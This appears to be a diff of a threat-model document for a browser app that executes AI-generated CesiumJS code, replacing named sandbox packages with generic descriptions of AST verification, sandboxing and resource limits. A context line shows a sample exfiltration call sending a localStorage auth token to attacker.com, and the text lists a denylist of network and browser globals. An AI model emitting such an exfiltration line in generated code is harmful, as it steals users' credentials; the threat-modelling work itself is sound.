@@ -6,14 +6,11 @@ This document outlines potential security vulnerabilities in the AI-driven Cesiu
 
 This is intentionally a **forward-looking threat model, not just a description of the current code**. It documents the full range of realistic attacks and the mitigations needed to defend against them — **including mitigations that are not yet implemented**. Treat unimplemented items as a security backlog / hardening roadmap, not as optional.
 
-**Current status:** this repo executes verified code directly in the browser (Gate 1 server-side static verification only). Gate 2 (browser-side sandbox isolation via `@cesium-ai/sandbox-cesium`, referenced throughout this document as the target design) is not implemented — code runs directly against the live Viewer with security relying solely on server-side AST verification. Runtime isolation via a sandboxed interpreter is recommended as a follow-up hardening step.
+**Current status:** this repo executes verified code directly in the browser (Gate 1 server-side static verification only). Gate 2 (browser-side sandbox isolation) is not implemented — code runs directly against the live Viewer with security relying solely on server-side AST verification. Runtime isolation via a sandboxed interpreter is recommended as a follow-up hardening step.
 
 ### Architecture View (components, trust boundaries & security gates)
 
-Every attack vector (**#1–#7**) is placed on the _real_ component architecture. The pipeline crosses
-two trust boundaries and passes through two security gates — **Gate 1** static verification
-(server-side, in `@cesium-ai/codegen-cesium`) and **Gate 2** sandbox isolation (browser-side, in
-`@cesium-ai/sandbox-cesium`). Attack labels (#1–#7) show where each vector strikes. Each vector links to its detailed section
+Every attack vector (**#1–#7**) is placed on the _real_ component architecture. Attack labels (#1–#7) show where each vector strikes. Each vector links to its detailed section
 in the table below.
 
 ```mermaid
@@ -21,7 +18,7 @@ flowchart TB
     subgraph CLIENT["Browser (untrusted execution surface)"]
         FE["ChatPanel / CesiumGlobe<br/>(frontend)"]
         subgraph GATE2["GATE 2 — Sandbox Isolation"]
-            SBX["runCesiumCodeInSandbox<br/>@cesium-ai/sandbox-cesium<br/>QuickJS-wasm · timeout 5s · mem 64MB<br/>entity/primitive/data-source caps"]
+            SBX["Sandboxed Execution<br/>timeout · memory limit · resource caps<br/>entity/primitive/data-source caps"]
         end
         VIEWER["CesiumJS Viewer<br/>(proxied handles only)"]
     end
@@ -250,11 +247,9 @@ fetch('https://attacker.com/steal?token=' + localStorage.getItem('auth_token'));
 
 **Mitigations:**
 
-1. **Static AST Verification** — `verifyCesiumCode` in
-   `packages/codegen-cesium/src/pipeline/ast-verifier.ts` parses generated code with
-   `acorn` and walks the AST with `acorn-walk`. It operates in **parse-only mode** — it never `eval`s,
-   `new Function()`s, or dynamically `import()`s the code. It uses a real AST walk rather than
-   regex string-matching (regex can be bypassed via `ev`+`al` concatenation or whitespace tricks).
+1. **Static AST Verification** — A robust code verifier parses generated code and walks the AST.
+   It operates in **parse-only mode** — it never `eval`s, `new Function()`s, or dynamically `import()`s the code.
+   It uses a real AST walk rather than regex string-matching (regex can be bypassed via `ev`+`al` concatenation or whitespace tricks).
    It rejects:
    ```text
    - eval(...) and bare `eval` references
@@ -272,16 +267,14 @@ fetch('https://attacker.com/steal?token=' + localStorage.getItem('auth_token'));
    calls `verifyCesiumCode(code)` without passing `allowedSymbols`, so free-identifier allowlisting
    is not enabled: any identifier that is not a banned global is permitted. The safety net is the
    banned-global denylist plus downstream sandbox containment. For defense in depth, pass
-   `getAllowedSymbols()` to `verifyCesiumCode` to enforce a positive allowlist:
+   the allowed Cesium symbols to `verifyCesiumCode` to enforce a positive allowlist:
 
    ```typescript
-   import { getAllowedSymbols } from "@cesium-ai/codegen-cesium";
-   const result = verifyCesiumCode(code, { allowedSymbols: getAllowedSymbols() });
+   const result = verifyCesiumCode(code, { allowedSymbols: getCesiumSymbolAllowlist() });
    ```
 
-3. **Sandbox Execution (QuickJS)** — Runtime execution is handled downstream by
-   `@cesium-ai/sandbox-cesium` in the frontend. Even if validation misses something:
-   - Code runs isolated in the QuickJS VM
+3. **Sandbox Execution** — Runtime execution is handled downstream in the frontend via a sandboxed environment. Even if validation misses something:
+   - Code runs isolated from the main application context
    - Cannot access main app globals
    - Cannot make unrestricted fetch calls
 
@@ -402,24 +395,19 @@ for (let i = 0; i < 1000000; i++) {
 
 **Mitigations:**
 
-1. **Execution Timeout** — `runCesiumCodeInSandbox` interrupts the VM after `DEFAULT_TIMEOUT_MS`
-   (5000ms, overridable via `timeoutMs`) in `packages/sandbox-cesium/src/cesium-code-sandbox.ts`:
+1. **Execution Timeout** — Sandboxed code execution is interrupted after a configured timeout (e.g., 5000ms):
+   - Prevents infinite loops and runaway operations
+   - Can be configured per execution environment
 
-   ```typescript
-   ctx.runtime.setInterruptHandler(shouldInterruptAfterDeadline(Date.now() + timeoutMs));
-   ```
-
-2. **Memory Limit** — Heap capped at `DEFAULT_MEMORY_LIMIT_BYTES` (64 MB) per run to prevent
+2. **Memory Limit** — Execution sandbox maintains a heap cap (e.g., 64 MB) per run to prevent
    out-of-memory crashes:
+   - Limits total memory allocated to generated code
+   - Prevents memory exhaustion attacks
 
-   ```typescript
-   ctx.runtime.setMemoryLimit(64 * 1024 * 1024); // 64 MB
-   ```
-
-3. **Runtime Entity/Primitive/Data-Source Caps** — `execution-guards.ts` enforces:
-   - Entity cap (`DEFAULT_MAX_ENTITIES = 200`)
+3. **Runtime Entity/Primitive/Data-Source Caps** — Resource limits enforced during execution:
+   - Entity cap (e.g., 200 entities maximum)
    - Generic collection caps for `scene.primitives` and `dataSources`, checked before each `add(...)`
-   - A `SandboxCallRateLimiter` (default 10 calls / 60s) bounds sandbox execution frequency
+   - Rate limiting on sandbox execution frequency
 
    ```typescript
    if (viewer.entities.values.length >= maxEntities) {
@@ -485,9 +473,9 @@ navigator.clipboard.read()
 
    This blocks `fetch()` to attacker domains.
 
-2. **Sandbox Isolation** — Generated code runs in the QuickJS-wasm VM (`@cesium-ai/sandbox-cesium`),
+2. **Sandbox Isolation** — Generated code runs in an isolated execution environment,
    not the page's global scope. It cannot reach `window`, `document`, or `localStorage`, and
-   interacts with the viewer only through the proxied host bridge (opaque handles). This is the
+   interacts with the viewer only through a controlled bridge with opaque handles. This is the
    primary runtime containment for browser-capability data.
 
 3. **Minimize Credentials in Browser** — Best practices include:
@@ -584,36 +572,37 @@ Generated Code → Browser Global Scope → Direct Access to viewer, window, doc
 
 ---
 
-### Option B: QuickJS Sandbox
+### Option B: Sandboxed Execution Environment
 
 **Architecture:**
 
 ```
-Generated Code → QuickJS WASM VM → Controlled Bridge → viewer (proxied)
-                                     ↓
-                              SandboxHandles (opaque IDs)
+Generated Code → Execution Sandbox → Controlled Bridge → viewer (proxied)
+                                          ↓
+                                   Opaque object handles
 ```
 
 **Security Characteristics:**
 
 - Isolated execution context
 - Timeout + memory limits enforced
-- Objects marshaled as opaque handles
+- Objects marshaled as opaque references
 - Resource exhaustion contained
 
 **Advantages:**
 
-- Strong process-level isolation
+- Strong process-level isolation from main application
 - Handles infinite loops gracefully by timeout
 - Memory exhaustion prevented by heap cap
 - Global scope pollution isolated to sandbox
+- Prevents direct access to browser APIs
 
 **Disadvantages:**
 
-- Increased complexity (handle wrapping/unwrapping)
-- Performance overhead (WASM marshaling)
-- Additional bundle size
-- Limited to 1 async call per script (Asyncify limitation)
+- Increased implementation complexity
+- Performance overhead from execution context management
+- Additional bundle size for sandbox runtime
+- May have architectural constraints depending on implementation
 
 **When to Consider:**
 
@@ -729,31 +718,26 @@ Generated Code → iframe with sandbox attribute
 
 ### For Personal/Demo App (Lower Risk):
 
-This is what the repo actually does today: server-side static verification with the parse-only
-`verifyCesiumCode`, then downstream sandboxed execution in the frontend. Do **not** hand-roll a
-regex "forbidden patterns" scanner \u2014 regex checks against source text are trivially bypassed
-(string concatenation, unicode escapes, whitespace) and are why this package uses an `acorn` AST
-walk instead.
+Implement server-side static verification with parse-only AST analysis, then consider sandboxed execution in the frontend. Do **not** hand-roll a regex "forbidden patterns" scanner — regex checks against source text are trivially bypassed (string concatenation, unicode escapes, whitespace). Use proper AST parsing and walking instead.
 
 ```typescript
 // Server-side: Static AST verification (parse-only, never executes code)
-import { verifyCesiumCode, getAllowedSymbols } from "@cesium-ai/codegen-cesium";
+// Use a robust AST parser and walker to validate code
+// Recommended: implement a positive identifier allowlist for additional safety
 
-// Recommended: opt in to the positive identifier allowlist (currently NOT enabled by
-// generateVerifiedCesiumCode, which calls verifyCesiumCode(code) with no allowedSymbols).
 const { verified, violations } = verifyCesiumCode(generatedCode, {
-  allowedSymbols: getAllowedSymbols(),
+  allowedSymbols: getCesiumSymbolAllowlist(),
 });
 if (!verified) {
   throw new Error("Code verification failed: " + violations?.join(", "));
 }
 
-// Frontend: Execute only via QuickJS sandbox, never eval/Function directly
+// Frontend: Execute only via sandbox isolation, never eval/Function directly
 ```
 
-**Verification Controls** (implemented in `packages/codegen-cesium/src/pipeline/ast-verifier.ts`):
+**Verification Controls:**
 
-- Parse-only `acorn` AST walk — code is never executed during verification
+- Parse-only AST walk — code is never executed during verification
 - Rejects `eval`, `Function`/`new Function`, dynamic `import()`
 - Rejects computed member access (`obj[expr]`) — dot notation only
 - Rejects network/browser globals: `fetch`, `XMLHttpRequest`, `WebSocket`, `window`, `document`,
@@ -768,13 +752,12 @@ if (!verified) {
 ### For Production App:
 
 ```typescript
-// Sandbox execution with resource limits
-import { runCesiumCodeInSandbox } from "@cesium-ai/sandbox-cesium";
-
-const result = await runCesiumCodeInSandbox({
+// Execute code within a sandboxed environment with resource limits
+const result = await executeCesiumCodeInSandbox({
   code: generatedCode,
   viewer: cesiumViewer,
   timeoutMs: 5000, // 5 second execution timeout
+  memoryLimitBytes: 64 * 1024 * 1024, // 64 MB heap cap
 });
 
 if (!result.success) {
